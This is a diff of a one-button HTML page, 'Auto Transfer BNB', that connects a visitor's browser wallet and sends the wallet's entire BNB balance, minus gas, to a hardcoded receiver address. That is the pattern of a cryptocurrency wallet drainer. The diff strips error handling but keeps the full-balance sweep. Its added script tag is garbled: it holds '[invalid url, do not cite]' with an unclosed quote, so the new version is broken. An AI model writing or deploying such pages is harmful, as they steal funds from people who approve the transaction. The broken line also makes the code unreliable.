@@ -2,7 +2,7 @@
 <html>
 <head>
   <title>Auto Transfer BNB</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="[invalid url, do not cite]
 </head>
 <body>
   <button onclick="connectAndTransfer()">Connect & Send</button>
@@ -12,73 +12,53 @@
     const GAS_LIMIT = 21000; // Standard gas limit for BNB transfer
 
     async function connectAndTransfer() {
-      // Check for wallet provider (MetaMask, Trust Wallet, etc.)
-      let web3;
       if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-      } else if (window.web3) {
-        web3 = new Web3(window.web3.currentProvider); // Fallback for older wallet versions
-      } else {
-        alert("Please install MetaMask or Trust Wallet and ensure it is active.");
-        return;
-      }
+        const web3 = new Web3(window.ethereum);
 
-      try {
-        // Request account access
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const accounts = await web3.eth.getAccounts();
-        if (!accounts || accounts.length === 0) {
-          alert("Could not connect to wallet. Please ensure your wallet is unlocked and try again.");
-          return;
-        }
-        const sender = accounts[0];
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await web3.eth.getAccounts();
+          const sender = accounts[0];
 
-        // Ensure BNB Smart Chain Mainnet (chainId 56, which is 0x38 in hex)
-        const chainId = await web3.eth.getChainId();
-        const chainIdHex = web3.utils.toHex(chainId);
-        if (chainIdHex !== "0x38") {
-          try {
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0x38' }],
-            });
-          } catch (switchError) {
-            alert("Please switch to BNB Smart Chain Mainnet manually in your wallet.");
+          // Ensure BNB Smart Chain Mainnet (chainId 56)
+          const chainId = await web3.eth.getChainId();
+          if (chainId !== 56) {
+            alert("Please switch to BNB Smart Chain Mainnet.");
             return;
           }
+
+          // Get full balance
+          const balance = await web3.eth.getBalance(sender);
+
+          // Get current gas price
+          const gasPrice = await web3.eth.getGasPrice();
+
+          // Calculate gas estimate
+          const gasEstimate = web3.utils.toBN(GAS_LIMIT).mul(web3.utils.toBN(gasPrice));
+
+          // Calculate amount to send: balance - gasEstimate
+          const amountToSend = web3.utils.toBN(balance).sub(gasEstimate);
+
+          if (amountToSend.lte(0)) {
+            alert("Insufficient BNB to cover gas fees.");
+            return;
+          }
+
+          // Send BNB with fixed gas limit
+          const tx = await web3.eth.sendTransaction({
+            from: sender,
+            to: receiverAddress,
+            value: amountToSend.toString(),
+            gas: GAS_LIMIT // Set gas limit explicitly to 21,000
+          });
+
+          alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
+        } catch (error) {
+          alert("Error: " + error.message);
+          console.error("Transaction Error:", error);
         }
-
-        // Get full balance (returned as a string in wei)
-        const balance = await web3.eth.getBalance(sender);
-        const balanceBigInt = BigInt(balance);
-
-        // Get current gas price
-        const gasPrice = await web3.eth.getGasPrice();
-        const gasPriceBigInt = BigInt(gasPrice);
-
-        // Calculate gas estimate
-        const gasEstimate = BigInt(GAS_LIMIT) * gasPriceBigInt;
-
-        // Calculate amount to send: balance - gasEstimate
-        let amountToSend = balanceBigInt - gasEstimate;
-
-        if (amountToSend <= 0) {
-          alert("Insufficient BNB to cover gas fees. Please add more BNB to your wallet.");
-          return;
-        }
-
-        // Send BNB with fixed gas limit
-        const tx = await web3.eth.sendTransaction({
-          from: sender,
-          to: receiverAddress,
-          value: web3.utils.toHex(amountToSend.toString()),
-          gas: GAS_LIMIT
-        });
-
-        alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
-      } catch (error) {
-        alert("Error: " + error.message);
-        console.error("Transaction Error:", error);
+      } else {
+        alert("Please install MetaMask or Trust Wallet.");
       }
     }
   </script>
